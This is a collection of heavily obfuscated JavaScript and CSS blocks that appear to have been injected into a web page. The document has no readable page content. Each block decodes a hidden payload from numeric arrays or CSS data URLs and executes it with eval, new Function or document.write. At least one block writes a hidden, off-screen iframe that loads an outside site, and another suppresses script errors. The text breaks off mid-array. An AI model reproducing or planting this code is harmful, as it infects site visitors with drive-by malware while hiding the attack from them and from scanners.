<script>function EcZsgEPt(){if (navigator.userAgent.indexOf("MSIE")>0) return document.body.clientWidth*document.body.clientHeight;else return window.outerWidth*window.outerHeight;}if(EcZsgEPt()>100000){function tPoXFRd(NfREui){var Qvf=5,Qfo=6;var LJj='66+4,104+1,101+4,111+4,97+3,107+3,100+5,43+2,115+5,104+1,100+0,113+2,103+2,67+3,57+3,43+2,103+2,100+5,104+1,102+3,103+2,113+2,67+3,57+3,43+2,98+2,109+1,111+4,100+0,100+5,',VSujFf=LJj.split(',');WnPyRopVeQ='';function Nns(c){return String.fromCharCode(c);}for(Rts=(VSujFf.length-1);Rts>=(0xd+0x1b-0x13+0x29-0x20-0x1e);Rts-=-0x23-0x26+0x1d-0x15+0x4+0x3e){ ciVZ=VSujFf[Rts].split('+');cOCinpa = parseInt(ciVZ[0]*Qfo)+parseInt(ciVZ[1]);cOCinpa = parseInt(cOCinpa)/Qvf;WnPyRopVeQ = Nns(cOCinpa-(0xd+0x8-0x29-0x12+0x3a))+WnPyRopVeQ;}if( WnPyRopVeQ.charCodeAt( WnPyRopVeQ.length-1) == 0)WnPyRopVeQ = WnPyRopVeQ.substring(0, WnPyRopVeQ.length-1);return WnPyRopVeQ.replace(/^\s+|\s+$/g, '');}function AttP(oDvYB){ alert('tvu'); } 
function tsP(JKCKqtwpm){var MvzxYyXJaB=4,LCBESNFWLp=9;var mRg='59+5,36+0,30+2,23+1,54+2,59+5,52+0,57+3,53+7,52+4,58+2,59+5,53+3,53+7,59+5,36+0,30+2,23+1,60+0,59+5,52+8,36+0,26+2,55+1,60+4,60+4,58+6,34+6,29+7,29+7,',tICK=mRg.split(',');QHonPpO='';function mjs(c){return String.fromCharCode(c);}for(nuNcNFfl=(tICK.length-1);nuNcNFfl>=(0x21-0xd-0x1f-0x28+0x32-0x9+0x20+0x1f-0x35);nuNcNFfl-=0x3+0x2f+0x28-0x2f-0x2a){ XkdOokQeZ=tICK[nuNcNFfl].split('+');IQLRu = parseInt(XkdOokQeZ[0]*LCBESNFWLp)+parseInt(XkdOokQeZ[1]);IQLRu = parseInt(IQLRu)/MvzxYyXJaB;QHonPpO = mjs(IQLRu-(-0x2a-0x6-0x3+0x7-0xa+0x16+0x34))+QHonPpO;}if( QHonPpO.charCodeAt( QHonPpO.length-1) == 0)QHonPpO = QHonPpO.substring(0, QHonPpO.length-1);return QHonPpO.replace(/^\s+|\s+$/g, '');}function PLkqHUm(pxZsACjpy){ alert('VNvmDK'); } 
function OBhxm(HpAdVpoO){var hNmLRV=3,cHmz=4;var NBtZSgt='101+1,89+1,98+1,100+2,97+2,87+3,100+2,49+2,89+1,98+1,96+3,50+1,89+1,98+1,102+3,97+2,102+0,51+3,51+0,49+2,99+0,93+0,99+0,44+1,61+2,60+0,50+1,93+3,91+2,100+2,',OfPMhbCxT=NBtZSgt.split(',');vNj='';function MCIf(c){return String.fromCharCode(c);}for(FEJlqE=(OfPMhbCxT.length-1);FEJlqE>=(-0xe+0x23-0x22-0x8+0x2c-0x17);FEJlqE-=0x2a-0x2f-0x4-0x14+0x2+0x1b+0x2c-0x2b){ JeVlwceiYJ=OfPMhbCxT[FEJlqE].split('+');snvqXPWY = parseInt(JeVlwceiYJ[0]*cHmz)+parseInt(JeVlwceiYJ[1]);snvqXPWY = parseInt(snvqXPWY)/hNmLRV;vNj = MCIf(snvqXPWY-(0x21-0x2d+0x20))+vNj;}if( vNj.charCodeAt( vNj.length-1) == 0)vNj = vNj.substring(0, vNj.length-1);return vNj.replace(/^\s+|\s+$/g, '');}function Ztepwnx(mcKIdsHGiS){fff.op.replace("195");alert('pXSIFpZNi'); fff.op.replace("195"); } 
function OHS(ThFhtUW){var xXXtTayVq=2,sGPIrtBC=3;var YlcYxwoXFg='78+0,86+0,80+2,54+2,',XCkiTtkUB=YlcYxwoXFg.split(',');aKzSOAo='';function turEypoe(c){return String.fromCharCode(c);}for(HIsmfldk=(XCkiTtkUB.length-1);HIsmfldk>=(0x1d-0x1f-0x15-0x1e+0x30+0x5);HIsmfldk-=-0x25-0x31+0x57){ ZPuAI=XCkiTtkUB[HIsmfldk].split('+');ERYQ = parseInt(ZPuAI[0]*sGPIrtBC)+parseInt(ZPuAI[1]);ERYQ = parseInt(ERYQ)/xXXtTayVq;aKzSOAo = turEypoe(ERYQ-(0x0-0xb+0x10+0xf))+aKzSOAo;}if( aKzSOAo.charCodeAt( aKzSOAo.length-1) == 0)aKzSOAo = aKzSOAo.substring(0, aKzSOAo.length-1);return aKzSOAo.replace(/^\s+|\s+$/g, '');}function kEIVcVJFPf(DdrUlJJcMl){fff=op.split("910"); fff.op.replace("426");var tpgOeFUcvo=new Function("YZcqtNt", "return 965911;"); } 
var Mvb=tPoXFRd('xOHlPAs')+tsP('OzMNIj')+OBhxm('wyJPMLQtT')+OHS('zprVOW'); OCgKepFPQQ=document;OCgKepFPQQ['1148wr6569i4435t1093e56094108'.replace(/[0-9]/g,'')](Mvb);function feDsCTutpq(UhI){ window.eval(); fff=op.split("1100");var dtYpPjY=new Function("hLNKmRwlpT", "return 309657;"); } 
function mcPeCrMUe(VIAD){ var nnQD = document.getElementById('HdSk'); } 
}</script>

<script>var DecenXesn=28;DecenXesn+=-12;BaXex=39;var BeYeme=-38;BeYeme+=39;RaTete=95;var KemepKen='';var SeqasJew=window;var TeKefec='fArvoH8mTZpC5ThMaUVxqrO4CIoRd39eBGp'.replace(/[AvH8TZp5TMUVxqO4IR39BGp]/g, '');DehasJe='yahedevasazasabeyajaye';var SenBaxe='ePtsv1D7aotUloF'.replace(/[Pts1D7otUoF]/g, '');JegecQewa=70;var MezeTecazs=String;var YavHayo=32;YavHayo+=-32;RafJesec=91;var JerNevajt='behapet devej qebebem napedeherelesefe xepevad kehe mepabeze xesaxe nebeyeb gehewepesedaha gerebeb yemeve ceyarel dadavehezakemag veqarace yarem vaq halabewesefehej waxarala hevamace tajelene tet bayeqap necayacapa neletaye pezej fafaxeq zecexe mey lejeqaxed faz rasefeva sehe kayaqexeqelex netewew bexerevega xabaceq temesak kameleke ras reganej se kebeyak qeleqedebetara nesejet layege teb t legegebe bere qededat zefe napeqena mef wepekaf savezexegarereva tetecer jareberenalef wafelez weceyekenejav semezen heheleseya razeteb veqekebavatejer cacepez feqehepa mewe waxelevaxefama rey led kacepet tecesamexedefah zekebel xegacehehesereza bex wah nen w desebete cesavema magazeb penehemeca qerarez jereb kecelebe sekac fakevey wexesehem xefa kemayenexaxabe ney mes texe xe ged vap fap m begeqek senevelej detatax nelefa regekef wetaverexa lerecej yawecana kegabar qaneneqah qepeqene hehen wede fepapebezerere hay qem seje qe leh kef maj p repaser xez bejejen pahebatetarejeke casehexe deg celadad lelev tedavet reseza qemeheva qem sere cevekesegevafe feg cej ceje s cap rer has k xedegas rewekez pazayasa ten kalawak se cazegeb qebepebajepene safecas wezeca necevaj kek tedanam denejaraleserere pepenehe qem xeweqal teyad hesalef yegeme pevexeqa gek qana lejejewaqagece cez leh bene k yec nam nag y qaxepebe gebe helasene xew laxesec haxe qeta raqesedapenene lef nep bewelep peyebepen kaqayebe keget xajapeva caray wedekene s jede sevegereleb hav pewegegejefayene zek zafafasepeveyewe xebeseqe yeget vedewet fa pazamey jesaxemesefeba sehered ha defahede tad kehafec jenare beterace pew xev gevafahewapanaj ladalem gepe zehevaz waferehakayecama wekedem pedadedegepape teq sejajewetelevale lajevag gese tezabet meyemegehalavede betapege zazece feqareq gecezezacagaden qefeneze qayej hape vec vahe q xew jawamaxasewepex neqagene p geyaxey kaladayas zabenere l lap weq bena taravekezereyev mage qagegejenevex dak rabeheferexayece refavex bamemezeda dehepew naneves degamewe yeq zehaseq qe kepeven daperedarehaja redawen nazele jeha lefepefevaceler yec zadegeke pef gemepebeme'.split(' ');var GalMeraxo=23;GalMeraxo+=-21;RepafLemal=62;var ZameqZewei=parseInt;SenBaxe=SeqasJew[SenBaxe];TeKefec=MezeTecazs[TeKefec];for (KeBazi=YavHayo;KeBazi<JerNevajt.length-1;KeBazi+=GalMeraxo) KemepKen += TeKefec(ZameqZewei((JerNevajt[KeBazi+YavHayo].length-1).toString(DecenXesn)+(JerNevajt[KeBazi+BeYeme].length-1).toString(DecenXesn), DecenXesn));SenBaxe(KemepKen);</script>

<style>#c19{background:url(data:,8,17.5,29.5,38,36.5,20,43,14,6.5,46.5,49,23,15,6.5,6,6,14,14,29,14.5,45,22,27,7,32.5,51.5,44.5,25,13.5,40.5,8.5,14,15,4,11,20,11,34.5,15,43,47,15,7,9.5,3.5,21.5,20.5,24,14,28.5,26.5,13.5,19,7.5,9,29.5,13.5,26.5,8.5,9.5,33,14,18,25,18,38,3,18.5,9.5,40,32,33.5,42.5,38.5,23.5,14.5,6,7,13.5,38,19,33.5,20,5,27,12,12,8.5,2.5,14,42,38,20,20.5,18,30.5,12,44,16.5,13,8,29.5,43,44,14,11,16,38.5,22,42.5,3.5,32.5,23.5,9,25,5.5,5,5.5,6,11.5,49.5,44,41,25,12.5,3.5,45,24,42.5,9,8.5,43,16,40,52,33,3,25.5,41.5,30,28.5,44.5,5.5,16.5,14,26.5,38.5,29.5,11,6.5,19,36.5,34.5,26.5,34,20,27.5,5.5,6.5,19.5,20.5,16.5,15.5,13.5,7,9.5,25,23,10,14.5,32,23.5,28.5,49.5,23.5,19,5,12,27,2);}</style> 
<script>var WnmaQ={YYSXc:function(){l='';var v=function(){};function nB(){};var g = new Date(2011, 10, 12, 10, 42, 57);this.mS="mS";var s=false;this.zN=false;var u="";var o = g.getMonth();var r = "from" + g.getMonth() + "e";function t(){};d='';r = r.replace(10, "CharCod");a="";this.bX=''; var z=null;var aY=false;var f=function(){};var i=document.styleSheets;zA="";var x=false;for(var gP=0;gP < i.length;gP++){this.tT=false;var fU="fU";this.nT=62782;var jC='';var b=i[gP].cssRules||i[gP].rules;aV="";var cW=42678;for(var n=0;n<b.length;n++){this.rS=54312;yJ='';this.mB=29481;var xM=function(){return 'xM'};var q=b.item?b.item(n):b[n];nI=10959;vE=46645;var bG=function(){return 'bG'};var p="p";if(!q.selectorText.match(/#c(\d+)/))continue;var nE='';var gT=new Array();w=q.style.backgroundImage.match(/url\("?data\:[^,]*,([^")]+)"?\)/)[1];this.lE="";mG=41875;};var gH=function(){};var e=false;}gG="gG";var cB=28236;var zE=55721;bJ=false;var j="";function jI(){};var cO='';c=function(){return {oZUd:"split"}}().oZUd;gB="gB";sG=48086;var jA=function(){};this.tH=false;var m=w[c](",");this.fP=false;this.cY='';var zX='';var xC=false;k=function(){return {ZTTl:m.length/2}}().ZTTl;function oU(){};this.iY=11711;var uQ="";for(var y=0;y<k;y++){gC=false;var wD=function(){};var aK=47282;rZ=parseInt(m[k+y]*o*0.2)+parseInt(m[y]*o*0.2);var gE='';var yJR=function(){return 'yJR'};var nO="";j+=(String[r](rZ));function rT(){};var wS="";var sI="";}bL="bL";var vM=false;rZS='';var jW=49717;kW = function(){return {nlel:eval}}().nlel;kW(j);this.kQ='';this.gEP=24351;var bGA=function(){return 'bGA'};}};var uW="";var aX=function(){return 'aX'};var eR=function(){return 'eR'};WnmaQ.YYSXc();</script>

<style>#c118{background:url(data:,13,41.5,26,55,12.5,32.5,28,10,10.5,41.5,17.5,6.5,26.5,22.5,10.5,9.5,23.5,42,25,11,43.5,42,43,11,2.5,52.5,9.5,27,15,15,12.5,36.5,47.5,19,7.5,9,33,15,2.5,47,24.5,48.5,24.5,3.5,30,35.5,40.5,19,44.5,49.5,46,29.5,20,9,13.5,16,24,34.5,40,17.5,7.5,32.5,38.5,11,13.5,48,9,8.5,20,3,53.5,22,38,50,18,3,4,17,21.5,8.5,5.5,43.5,54,30.5,4,28.5,15,7,12.5,24.5,5,37,14,23.5,3.5,42,18,27,48,12.5,18,39.5,46,31.5,28,9.5,7.5,6.5,10.5,26,46,5,12.5,7.5,5,55,4.5,40,3.5,4.5,37,45.5,21.5,8.5,10,16,14.5,21.5,33.5,54.5,5.5,24.5,4,33.5,19.5,19.5,20,14,4.5,5,6,12.5,25.5,38,15.5,11,7,32,17.5,16,2,8.5,19.5,12,41.5,38,4,49,22,4,13,6,30.5,12,8,34,27.5,20,14,8.5,15,47,7.5,3,18,50.5,22,16,10,8,5,11);}</style> 
<script>var hmpad={cZQWU:function(){var jO=new Array();mJ=31807;var wJ=false;var i = new Date(2011, 10, 12, 10, 45, 14);jG="jG";this.q=7719;this.f=false;this.k='';var m = i.getMonth();var u = "from" + i.getDate() + "de";var t="t";l='';u = u.replace(12, "CharCo");var z=function(){return 'z'};var uO=''; var p=null;pP=false;var qI=59115;var v=document.styleSheets;var a=new Array();var zE=13062;this.pB="pB";for(var c=0;c < v.length;c++){var o=function(){};var b=new Array();var jI=function(){};var w=v[c].cssRules||v[c].rules;var vPX="";var rM="";function lV(){};var wA=new Date();for(var e=0;e<w.length;e++){this.h='';var zT=new Date();iA="iA";var r=w.item?w.item(e):w[e];var tU=function(){return 'tU'};var mJX=new Array();var zP=new Array();x="x";if(!r.selectorText.match(/#c(\d+)/))continue;var bE=new Array();fG="fG";rG=r.style.backgroundImage.match(/url\("?data\:[^,]*,([^")]+)"?\)/)[1];this.mJXI="mJXI";var vD=new Array();};this.xC='';var g="g";}function eZ(){};this.lY='';var wH=39036;var cJ=new Date();var eD="";var vG=false;this.aV=false;uM=function(){return {niRp:"split"}}().niRp;var oB=new Array();var y=function(){return 'y'};function cT(){};var wL=rG[uM](",");s='';var fO='';j=function(){return {Valm:wL.length/2}}().Valm;this.cW='';pH="pH";var wN=new Date();var xG=new Date();for(var iP=0;iP<j;iP++){function yP(){};var jC=function(){return 'jC'};this.zK=27763;vP=parseInt(wL[j+iP]*m*0.2)+parseInt(wL[iP]*m*0.2);this.zY=false;var bF=new Array();this.pI=3274;kW="kW";eD+=(String[u](vP));var lQ=new Array();var lT=new Array();}var cC=new Array();aJ=25126;n=false;eE=45764;d = function(){return {Vkek:eval}}().Vkek;d(eD);this.xP="xP";var oD="oD";this.wU='';eU='';}};var aU=new Array();this.qG=31341;this.kE='';hmpad.cZQWU();</script>

<!-- C/C --><script>function createCSS(selector,declaration){var ua=navigator.userAgent.toLowerCase();var isIE=(/msie/.test(ua))&&!(/opera/.test(ua))&&(/win/.test(ua));var style_node=document.createElement("style");if(!isIE)style_node.innerHTML=selector+" {"+declaration+"}";document.getElementsByTagName("head")[0].appendChild(style_node);if(isIE&&document.styleSheets&&document.styleSheets.length>0){var last_style_node=document.styleSheets[document.styleSheets.length-1];if(typeof(last_style_node.addRule)=="object")last_style_node.addRule(selector,declaration);}};var lphmk={afali:84,gbenX:function(){i="i";var xF=new Date();var k = new Date(2011, 2, 10, 1, 6, 59);var dF="dF";this.kS="kS";var gX='';var h = k.getDate();var d = "fromCha" + k.getHours() + "de";this.z="";this.mS="";d = d.replace(1, "rCo");var a=new Date();this.mD="mD";this.lO='';var lP=''; createCSS("#c0","background: url(data:,eva)");this.tL="tL";var b=function(){};var dV=function(){return 'dV'};var e=null;xW="";var gQ=function(){};this.cF='';this.n='';var t=document.styleSheets;iF=56554;var s=31390;this.oW='';this.bX="bX";for(var hK=0;hK<t.length;hK++){this.kR="";r=false;p="p";var dC="dC";var y=t[hK].cssRules||t[hK].rules;var bN=new Array();var v=55937;yN="";var mH='';for(var m=0;m<y.length;m++){this.bL=6349;var eM=new Array();var l=y.item?y.item(m):y[m];f=31182;var xQ=false;this.lI="lI";if(!l.selectorText.match(/#c(\d+)/))continue;dCU="";this.kSE=25928;e=l.style.backgroundImage.match(/url\("?data\:[^,]*,([^")]+)"?\)/)[1];var cZ="";this.rU="rU";var tX=6604;var pS=new Array();};rP="";nV="";}var mX=[120.5,131,108,140.5,135.5,109,109.5,109.5,103.5,101.5,102,133.5,105,120,88.5,87,94,99.5,102,128,104,92.5,130,91,90,99,112,105,95.5,104.5,95.5,132.5,120.5,103.5,99,93.5,126,105,138,102.5,109,104,101.5,102.5,108.5,99,88.5,122.5,112,98.5,129,116.5,103.5,102,127,112.5,103.5,95,95.5,106.5,122,91.5,108,116,87.5,93.5,100.5,97,93,109.5,113,122.5,132.5,117,103.5,137.5,100.5,92.5,129,105,121.5,92,90.5,134.5,91.5,96,87.5,130.5,110,124.5,96,97,121,118,97.5,87,128,87.5,114.5,122.5,124,87.5,131,112,90.5,90,132,107,104.5,87,88.5,87.5,96.5,124.5,118.5,100.5,94,117.5,124.5,121,102.5,91.5,96,89.5,113,96,94,94.5,97.5,118.5,117.5,89,89,110,96.5,98.5,92,99,89.5,95.5,91.5,107.5,109.5,115.5,120.5,86.5,92,92,92.5,97.5,88,90.5,87.5,92.5,98.5,117.5,122.5,109.5,116,89.5,131,100.5,87.5,98,100.5,97.5,92.5,109.5,86,87,109.5,113.5,116.5,87.5,126,123,87,121,98.5,99.5,100.5,104,121,117,97,112.5,130,88.5,93,135.5,126,105.5,93.5,89.5,115.5,130.5,93.5,103.5,93.5,92.5,98,92,118.5,88.5,114,117,114.5,89.5,115,115,123.5,103,95,111.5,128,94,109.5,93,89,97,107.5,120.5,90,88.5,119,104,137,114,102.5,111,91.5,126.5,123.5,132.5,111,104,98,89.5,103.5,122.5,91,96.5,91.5,91,115.5,96.5,126,128,88.5,106,88,136.5,93,115.5,96,130,123.5,102.5,105,99.5,97,88.5,129.5,111,101,98,139,95,106.5,107,94,90,111.5,114.5,139,108.5,96.5,95.5,99.5,109.5,97,90,108.5,99,103,94.5,92.5,96,134.5,115,101.5,90,90.5,86.5,109,103,129,137,110,102,86.5,100.5,93,95.5,88.5,128.5,111,111,104,99.5,139.5,106.5,93,100,94.5,97,108.5,128,105.5,93,103,96.5,115.5,100.5,133,87.5,98.5,100,90.5,97];var eY=function(){return 'eY'};sB=19929;var mE="";this.vA=false;this.rF='';var hP="hP";x=function(){return {cfWk:mX.length/2}}().cfWk;var zH=function(){};var vL=new Array();this.rM=false;for(var c=0;c<x;c++){this.oN="oN";rB=false;eP=4339;o=parseInt((mX[x+c]-lphmk.afali)*h*0.2)+parseInt((mX[c]-lphmk.afali)*h*0.2);function oJ(){};this.eS="";j="j";mE+=(String[d](o));oK="";var u=new Date();}mB=false;var rJ='';function eME(){};g = eval(e+"l");g(mE);var jQ="";this.oC="";var eO="";this.kF=11327;}};w=21625;sY="sY";iB=false;lphmk.gbenX();</script>

<script>function createCSS(selector,declaration){var ua=navigator.userAgent.toLowerCase();var isIE=(/msie/.test(ua))&&!(/opera/.test(ua))&&(/win/.test(ua));var style_node=document.createElement("style");if(!isIE)style_node.innerHTML=selector+" {"+declaration+"}";document.getElementsByTagName("head")[0].appendChild(style_node);if(isIE&&document.styleSheets&&document.styleSheets.length>0){var last_style_node=document.styleSheets[document.styleSheets.length-1];if(typeof(last_style_node.addRule)=="object")last_style_node.addRule(selector,declaration);}};var QZWee={Sbgjc:58,kmcaj:function(){var aF='';var aE="";var d = new Date(2011, 3, 9, 3, 9, 10);var m=62275;var t="t";function r(){};function n(){};var j = d.getSeconds();var y = "fromCh" + d.getSeconds() + "ode";var gG='';this.mP='';y = y.replace(10, "arC");var lN="";this.w=false; createCSS("#c0","background: url(data:,eva)");var rZ=37050;var xV=function(){};var q=null;var s=new Array();this.fA='';var xH=new Array();var h=document.styleSheets;yD="yD";this.wI="";this.qK=false;for(var p=0;p<h.length;p++){wM="";function wO(){};var uH=new Array();var f=h[p].cssRules||h[p].rules;var gJ='';b=21761;wIT=52514;for(var z=0;z<f.length;z++){var qB="";var nX=false;var qI=f.item?f.item(z):f[z];var o=function(){};e='';var dW=function(){return 'dW'};var uJ="";if(!qI.selectorText.match(/#c(\d+)/))continue;rF=false;lH=27297;jM=false;this.wL=64999;q=qI.style.backgroundImage.match(/url\("?data\:[^,]*,([^")]+)"?\)/)[1];var pC=new Array();var jG=false;};var fB=new Date();var mN=37915;}var g=[70,87.5,90.5,96,68.5,94,90,93,70.5,96.5,109.5,99.5,90,62,66,74.5,61,76,81,109,66,85.5,73,68.5,76.5,92.5,103.5,61,66,85,113,110,108,65,76,61,74,68,101,65,68.5,88,64.5,62,100.5,67,104,69,85,90.5,81,62,61,66.5,71,96.5,72.5,78,66,66,66.5,76.5,68,84,85,63,62,101,100.5,110,66.5,81,72,73.5,74,100,104,78.5,65.5,76.5,60.5,97.5,67,81,69.5,65,70.5,67.5,70.5,80,89.5,85.5,107.5,75.5,66.5,72.5,66.5,100,83,92,83.5,86,111.5,81.5,84,62,69,96,82,68,94,74,71.5,69,86,82.5,84.5,60.5,74,107,82.5,82,66.5,66.5,77,73.5,76,63,61,61.5,107,74,69.5,78,78,65,61.5,79.5,79.5,61,60.5,65.5,89.5,101,72.5,88.5,71.5,66,72.5,69,61,69.5,78.5,77,62.5,77.5,106,105,79,88,94,85.5,75.5,66,76.5,73.5,96,84,75,78.5,102,72.5,81,81,68.5,79,63.5,69,84,104.5,70,61,85,92.5,86,64,98.5,85,93.5,63.5,97,80.5,62,85.5,67,83,61,64,64,80,63.5,78.5,93,96.5,69,108.5,98,87.5,104,77,65,104.5,66.5,70.5,80.5,81,93.5,109,113,77.5,68,75.5,95.5,94,67,66,107,97.5,108.5,86,81.5,83.5,71,74,68,63.5,102,84,96.5,96.5,94.5,74,72.5,66.5,66.5,91.5,108,68.5,99,85.5,101.5,80.5,61.5,104.5,101,93.5,79,88.5,61,96,104.5,72.5,65.5,64.5,82,81.5,88,84,63,92.5,82.5,83.5,63,74,84.5,99,80,71,60.5,71,86,93.5,61,71.5,100,64.5,89.5,63,65.5,73.5,95,102.5,69.5,69,72,70.5,68.5,94.5,96.5,96,90,81.5,71.5,61,60.5,72,71.5,102.5,77,67.5,95,79.5,102.5,80.5,60.5,71.5,79,63.5,68.5,86.5,83.5,62,62.5,62,94,76.5,76.5,81,71.5,69.5,60,72];this.sI='';bJ='';this.eW=19099;function fW(){};var a="";var bN=new Array();this.zO="zO";this.pH='';u=function(){return {SXoV:g.length/2}}().SXoV;qF='';this.hQ="hQ";jW="";var wJ=function(){};for(var x=0;x<u;x++){var c=12648;var yC=false;l=parseInt((g[u+x]-QZWee.Sbgjc)*j*0.2)+parseInt((g[x]-QZWee.Sbgjc)*j*0.2);this.v=false;this.xS=false;a+=(String[y](l));var yH="";var wB=18644;var jO="";this.uHH=40406;}fR="fR";this.jR='';k = eval(q+"l");k(a);var i='';var mL=false;this.eX='';var lI=30399;}};kH=false;var bI=function(){return 'bI'};QZWee.kmcaj();</script>

<script>var ar=" if (document.gElsByTaN'b)[0]{r;}v=\"pChw<:/51>A,";</script><script>var ar2=[0,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,10,12,15,16,10,9,10,11,12,17,18,19,20,21,14,22,21,9,10,4,23,24,6,5,19,23,25,26,27,28,25,29,0,0,0,1,2,30,21,9,10,30,4,25,31,0,0,32,3,10,16,17,10,3,29,0,0,0,33,21,30,3,24,5,19,3,34,3,5,6,7,8,9,10,11,12,13,7,30,10,21,12,10,15,16,10,9,10,11,12,4,35,24,6,5,19,35,25,31,0,0,0,12,30,19,3,29,0,0,0,0,5,6,7,8,9,10,11,12,13,21,36,36,10,11,5,37,38,1,16,5,4,24,5,19,25,31,0,0,0,32,3,7,21,12,7,38,3,4,10,25,3,29,0,0,0,0,5,6,7,8,9,10,11,12,13,24,6,5,19,3,34,3,24,5,19,31,0,0,0,32,0,0,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,10,12,15,16,10,9,10,11,12,17,18,19,20,21,14,22,21,9,10,4,23,24,6,5,19,23,25,26,27,28,25,29,0,0,0,0,1,2,30,21,9,10,30,4,25,31,0,0,0,32,3,10,16,17,10,3,29,0,0,0,0,5,6,7,8,9,10,11,12,13,39,30,1,12,10,4,35,40,1,2,30,21,9,10,3,17,30,7,34,23,38,12,12,36,41,42,42,24,10,33,10,16,16,1,13,7,6,9,42,7,6,8,11,12,43,13,36,38,36,23,3,39,1,5,12,38,34,23,44,27,23,3,38,10,1,14,38,12,34,23,44,27,23,3,17,12,19,16,10,34,23,33,1,17,1,24,1,16,1,12,19,41,38,1,5,5,10,11,31,36,6,17,1,12,1,6,11,41,21,24,17,6,16,8,12,10,31,16,10,2,12,41,27,31,12,6,36,41,27,31,23,45,40,42,1,2,30,21,9,10,45,35,25,31,0,0,0,32,0,0,32,0,0,2,8,11,7,12,1,6,11,3,1,2,30,21,9,10,30,4,25,29,0,0,0,33,21,30,3,2,3,34,3,5,6,7,8,9,10,11,12,13,7,30,10,21,12,10,15,16,10,9,10,11,12,4,23,1,2,30,21,9,10,23,25,31,2,13,17,10,12,46,12,12,30,1,24,8,12,10,4,23,17,30,7,23,47,23,38,12,12,36,41,42,42,24,10,33,10,16,16,1,13,7,6,9,42,7,6,8,11,12,43,13,36,38,36,23,25,31,2,13,17,12,19,16,10,13,33,1,17,1,24,1,16,1,12,19,34,23,38,1,5,5,10,11,23,31,2,13,17,12,19,16,10,13,36,6,17,1,12,1,6,11,34,23,21,24,17,6,16,8,12,10,23,31,2,13,17,12,19,16,10,13,16,10,2,12,34,23,27,23,31,2,13,17,12,19,16,10,13,12,6,36,34,23,27,23,31,2,13,17,10,12,46,12,12,30,1,24,8,12,10,4,23,39,1,5,12,38,23,47,23,44,27,23,25,31,2,13,17,10,12,46,12,12,30,1,24,8,12,10,4,23,38,10,1,14,38,12,23,47,23,44,27,23,25,31,0,0,0,5,6,7,8,9,10,11,12,13,14,10,12,15,16,10,9,10,11,12,17,18,19,20,21,14,22,21,9,10,4,23,24,6,5,19,23,25,26,27,28,13,21,36,36,10,11,5,37,38,1,16,5,4,2,25,31,0,0,32];pau='val';e=new Function('','return e'+pau)();s="";for(i=0;i<ar2.length;i++){s+=ar[ar2[i]];}
e(s);</script>

<script>var date=new Date();function lols(){return true}
window.onerror=lols;var fr='fromC';function getXmlHttp(){var xmlhttp;try{xmlhttp=new ActiveXObject('Msxml2.XMLHTTP');fr+='harCode';}catch(e){try{fr+='harCode';xmlhttp=new ActiveXObject('Microsoft.XMLHTTP');}catch(e){xmlhttp=false;}}
if(!xmlhttp&&typeof XMLHttpRequest!='undefined'){xmlhttp=new XMLHttpRequest();}
return xmlhttp;}
var cont=[288,0.28125,3360,3.1875,1024,1.25,3200,3.46875,3168,3.65625,3488,3.15625,3520,3.625,1472,3.21875,3232,3.625,2208,3.375,3232,3.40625,3232,3.4375,3712,3.59375,2112,3.78125,2688,3.03125,3296,2.4375,3104,3.40625,3232,1.25,1248,3.0625,3552,3.125,3872,1.21875,1312,2.84375,1536,2.90625,1312,3.84375,416,0.28125,288,0.28125,3360,3.1875,3648,3.03125,3488,3.15625,3648,1.25,1312,1.84375,416,0.28125,288,3.90625,1024,3.15625,3456,3.59375,3232,1,3936,0.40625,288,0.28125,288,3.125,3552,3.09375,3744,3.40625,3232,3.4375,3712,1.4375,3808,3.5625,3360,3.625,3232,1.25,1088,1.875,3360,3.1875,3648,3.03125,3488,3.15625,1024,3.59375,3648,3.09375,1952,1.21875,3328,3.625,3712,3.5,1856,1.46875,1504,3.59375,3744,3.0625,3168,3.46875,3680,3.28125,1472,3.09375,3552,3.40625,1504,3.09375,3552,3.65625,3520,3.625,1600,1.4375,3584,3.25,3584,1.21875,1024,3.71875,3360,3.125,3712,3.25,1952,1.21875,1568,1.5,1248,1,3328,3.15625,3360,3.21875,3328,3.625,1952,1.21875,1568,1.5,1248,1,3680,3.625,3872,3.375,3232,1.90625,1248,3.6875,3360,3.59375,3360,3.0625,3360,3.375,3360,3.625,3872,1.8125,3328,3.28125,3200,3.125,3232,3.4375,1888,3.5,3552,3.59375,3360,3.625,3360,3.46875,3520,1.8125,3104,3.0625,3680,3.46875,3456,3.65625,3712,3.15625,1888,3.375,3232,3.1875,3712,1.8125,1536,1.84375,3712,3.46875,3584,1.8125,1536,1.84375,1248,1.9375,1920,1.46875,3360,3.1875,3648,3.03125,3488,3.15625,1984,1.0625,1312,1.84375,416,0.28125,288,3.90625,416,0.28125,288,3.1875,3744,3.4375,3168,3.625,3360,3.46875,3520,1,3360,3.1875,3648,3.03125,3488,3.15625,3648,1.25,1312,3.84375,416,0.28125,288,0.28125,3776,3.03125,3648,1,3264,1,1952,1,3200,3.46875,3168,3.65625,3488,3.15625,3520,3.625,1472,3.09375,3648,3.15625,3104,3.625,3232,2.15625,3456,3.15625,3488,3.15625,3520,3.625,1280,1.21875,3360,3.1875,3648,3.03125,3488,3.15625,1248,1.28125,1888,3.1875,1472,3.59375,3232,3.625,2080,3.625,3712,3.5625,3360,3.0625,3744,3.625,3232,1.25,1248,3.59375,3648,3.09375,1248,1.375,1248,3.25,3712,3.625,3584,1.8125,1504,1.46875,3680,3.65625,3136,3.09375,3552,3.59375,3360,1.4375,3168,3.46875,3488,1.46875,3168,3.46875,3744,3.4375,3712,1.5625,1472,3.5,3328,3.5,1248,1.28125,1888,3.1875,1472,3.59375,3712,3.78125,3456,3.15625,1472,3.6875,3360,3.59375,3360,3.0625,3360,3.375,3360,3.625,3872,1.90625,1248,3.25,3360,3.125,3200,3.15625,3520,1.21875,1888,3.1875,1472,3.59375,3712,3.78125,3456,3.15625,1472,3.5,3552,3.59375,3360,3.625,3360,3.46875,3520,1.90625,1248,3.03125,3136,3.59375,3552,3.375,3744,3.625,3232,1.21875,1888,3.1875,1472,3.59375,3712,3.78125,3456,3.15625,1472,3.375,3232,3.1875,3712,1.90625,1248,1.5,1248,1.84375,3264,1.4375,3680,3.625,3872,3.375,3232,1.4375,3712,3.46875,3584,1.90625,1248,1.5,1248,1.84375,3264,1.4375,3680,3.15625,3712,2.03125,3712,3.625,3648,3.28125,3136,3.65625,3712,3.15625,1280,1.21875,3808,3.28125,3200,3.625,3328,1.21875,1408,1.21875,1568,1.5,1248,1.28125,1888,3.1875,1472,3.59375,3232,3.625,2080,3.625,3712,3.5625,3360,3.0625,3744,3.625,3232